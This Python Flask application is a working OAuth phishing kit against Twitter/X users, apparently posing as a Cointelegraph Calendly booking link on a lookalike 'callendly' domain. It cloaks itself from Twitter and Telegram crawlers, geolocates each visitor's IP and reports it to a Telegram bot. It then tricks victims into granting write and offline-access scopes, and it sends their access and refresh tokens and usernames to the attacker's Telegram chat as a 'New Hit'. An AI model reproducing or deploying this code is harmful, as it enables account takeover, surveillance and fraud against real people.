from flask import Flask, request, redirect
import requests
import base64

app = Flask(__name__)

TWITTER_CLIENT_ID = '' # Replace with your Twitter client ID
TWITTER_CLIENT_SECRET = '' # Replace with your Twitter client secret

TELEGRAM_GROUP_CHAT_ID = '' # Replace with your Telegram group chat ID
TELEGRAM_BOT_TOKEN = '' # Replace with your Telegram bot token

credentials = f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}"
credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')

@app.route('/cointelegraph') # Examples: cointelegraph, decryptmedia, etc
def index():
    user_agent = request.headers.get('User-Agent')

    if user_agent is None:
        user_agent = ''

    user_agent = user_agent.strip('\r\n')

    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://calendly.com/cointele')
    else:
        if 'X-Forwarded-For' in request.headers:
            real_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
        else:
            real_ip = request.remote_add

        res = requests.get(f'http://ip-api.com/json/{real_ip}')
        data = res.json()

        country = data["country"]
        country_code = data["countryCode"]
        city = data["city"]

        code_points = [ord(char) + 127397 for char in country_code]
        country_flag = ''.join(chr(code_point) for code_point in code_points)

        message = f'🔗 Connection: {real_ip}\n\n{country_flag} {city}, {country}'

        requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
            data={
                'chat_id': TELEGRAM_GROUP_CHAT_ID,
                'text': message
            }
        )

        TWITTER_CALLBACK_URL = 'https://callendly.pythonanywhere.com/auth' # Example: /auth, /callback, /authorize
        twitter_oauth_url = f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}&redirect_uri={TWITTER_CALLBACK_URL}&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write&state=state&code_challenge=challenge&code_challenge_method=plain'
        return redirect(twitter_oauth_url)


@app.route('/auth') # Examples: auth, callback, authorize
def callback():
    authorization_code = request.args.get('code')

    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
    user_lookup_url = 'https://api.twitter.com/2/users/me'

    request_data = {
        'grant_type': 'authorization_code',
        'code': authorization_code,
        'redirect_uri': 'https://callendly.pythonanywhere.com/auth', # Example: https://your-name.pythonanywhere.com/your-redirect
        'code_verifier': "challenge"
    }

    headers = {
        'Authorization': f'Basic {credentials_base64}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    response = requests.post(token_exchange_url,
                             data=request_data,
                             headers=headers)
    response_data = response.json()
    print(response_data)

    access_token = response_data['access_token']
    refresh_token = response_data['refresh_token']

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
    }

    response = requests.get(user_lookup_url,
                             headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    send_to_telegram(username, access_token, refresh_token, TELEGRAM_GROUP_CHAT_ID)

    return redirect("https://calendly.com/cointele/45min?back=1&month=2024-08", code=302)

def send_to_telegram(username: str, access_token: str, refresh_token: str, group_id) -> None:
    message: str = f'⚠️ *New Hit* ⚠️\n\nx.com/{username}\n\n🔑 Access Token:\n`{access_token}`\n\n🔄 Refresh Token:\n`{refresh_token}`'

    requests.post(
        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
        data={
            'chat_id': group_id,
            'text': message,
            'parse_mode': 'MarkDown'
        })

if __name__ == '__main__':
  app.run()
